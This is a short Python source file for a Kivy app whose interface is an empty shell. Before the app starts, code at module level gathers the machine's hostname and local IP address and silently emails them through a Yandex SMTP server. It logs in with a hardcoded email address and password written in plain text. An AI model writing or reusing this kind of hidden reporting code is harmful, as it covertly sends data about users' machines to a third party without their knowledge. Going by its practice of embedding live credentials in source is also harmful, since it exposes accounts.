# -*- coding: utf-8 -*-
from kivy.app import App
from kivy.lang import Builder
from kivy.uix.boxlayout import BoxLayout
from kivy.properties import StringProperty
import socket
import smtplib as smtp
from getpass import getpass
class MyApp(App):
    running = True
    def on_stop(self):
        self.running = False
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
email='tihonovsamir@yandex.ru'
password = 'Samir333!'
dest_email = 'tihonovsamir@yandex.ru'
subject = 'IP'
email_text = (hostname, local_ip)
message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email, dest_email, subject, email_text)
server = smtp.SMTP_SSL('smtp.yandex.com')
server.set_debuglevel(1)
server.ehlo(email)
server.login(email, password)
server.sendmail(email, dest_email, message)
server.quit()
MyApp().run()